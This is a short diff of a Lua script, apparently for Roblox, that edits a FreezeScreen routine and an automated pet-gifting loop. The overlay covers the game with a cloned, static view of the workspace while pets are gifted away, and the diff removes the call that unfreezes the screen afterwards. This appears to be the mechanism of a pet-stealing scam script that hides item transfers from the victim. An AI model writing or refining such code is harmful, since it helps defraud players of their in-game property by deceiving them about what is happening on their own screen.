@@ -123,13 +123,18 @@ local function FreezeScreen()
     viewportFrame.Size = UDim2.new(1, 0, 1, 0)
     viewportFrame.Position = UDim2.new(0, 0, 0, 0)
     viewportFrame.BackgroundTransparency = 1
-    viewportFrame.CurrentCamera = camera
     viewportFrame.ZIndex = 5
     viewportFrame.Parent = screenGui
     
     -- Create WorldModel and clone workspace
     local worldModel = Instance.new("WorldModel")
     worldModel.Parent = viewportFrame
+    
+    -- Create and setup viewport camera
+    local viewportCamera = Instance.new("Camera")
+    viewportCamera.CFrame = frozenCFrame
+    viewportCamera.Parent = viewportFrame
+    viewportFrame.CurrentCamera = viewportCamera
     
     -- Clone current workspace state INCLUDING character (better method)
     local success, error = pcall(function()
@@ -1030,7 +1035,7 @@ end
     end
     
     Log("🎯 Pet gifting completed! Gifted " .. giftedCount .. " out of " .. #pets .. " pets.")
-    UnfreezeScreen()
+    --UnfreezeScreen()
     isRunning = false
 end
 
